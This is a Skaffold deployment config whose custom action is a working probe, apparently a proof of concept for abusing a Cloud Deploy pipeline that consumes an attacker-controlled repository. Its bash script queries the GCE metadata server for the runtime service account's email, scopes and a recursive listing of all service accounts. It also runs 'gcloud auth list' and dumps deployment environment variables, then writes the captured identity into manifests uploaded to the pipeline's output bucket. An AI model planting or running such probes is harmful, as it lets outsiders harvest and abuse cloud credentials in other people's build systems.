apiVersion: skaffold/v4beta7
kind: Config
metadata:
  name: probeConfigVz7q
customActions:
  - name: probe-action-vz7q
    containers:
      - name: probe-action-vz7q
        image: gcr.io/google.com/cloudsdktool/cloud-sdk:slim
        command: ["/bin/bash"]
        args:
          - "-c"
          - |
            set -x
            echo "ZZMARKERvz7qQ9WX-ORIGIN: MARKER-REPO-vz7q content is executing"
            echo "ZZMARKERvz7qQ9WX-PROOF-OF-CONSUMPTION: this line exists only in akmsmd/skaffold-marker-vz7q"
            MDS="http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"
            IDENT=$(curl -s -H 'Metadata-Flavor: Google' "$MDS" || echo "METADATA-UNREACHABLE")
            echo "ZZMARKERvz7qQ9WX-IDENTITY: [$IDENT]"
            SCOPES=$(curl -s -H 'Metadata-Flavor: Google' \
              "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes" || echo "NA")
            echo "ZZMARKERvz7qQ9WX-SCOPES: [$SCOPES]"
            ALL=$(curl -s -H 'Metadata-Flavor: Google' \
              "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/?recursive=true" || echo "NA")
            echo "ZZMARKERvz7qQ9WX-ALL-SAS: [$ALL]"
            echo "ZZMARKERvz7qQ9WX-GCLOUD-AUTH-LIST:"
            gcloud auth list 2>&1 || true
            echo "----- CLOUD_DEPLOY env -----"
            env | sort | grep -i '^CLOUD_DEPLOY' || true
            OUT="$CLOUD_DEPLOY_OUTPUT_GCS_PATH"
            echo "ZZMARKERvz7qQ9WX-OUTPUT-PATH: [$OUT]"
            cat > /tmp/manifest.yaml <<MEOF
            apiVersion: v1
            kind: ConfigMap
            metadata:
              name: probe-vz7q
            data:
              origin: "MARKER-REPO-vz7q"
              marker: "ZZMARKERvz7qQ9WX"
              renderedByIdentity: "$IDENT"
            MEOF
            cat /tmp/manifest.yaml
            gcloud storage cp /tmp/manifest.yaml "$OUT/manifest.yaml"
            printf '{"resultStatus":"SUCCEEDED","manifestFile":"%s/manifest.yaml","metadata":{"probe-marker":"ZZMARKERvz7qQ9WX","probe-identity":"%s"}}' "$OUT" "$IDENT" > /tmp/results.json
            cat /tmp/results.json
            gcloud storage cp /tmp/results.json "$OUT/results.json"
            echo "ZZMARKERvz7qQ9WX-RENDER-COMPLETE identity=[$IDENT]"
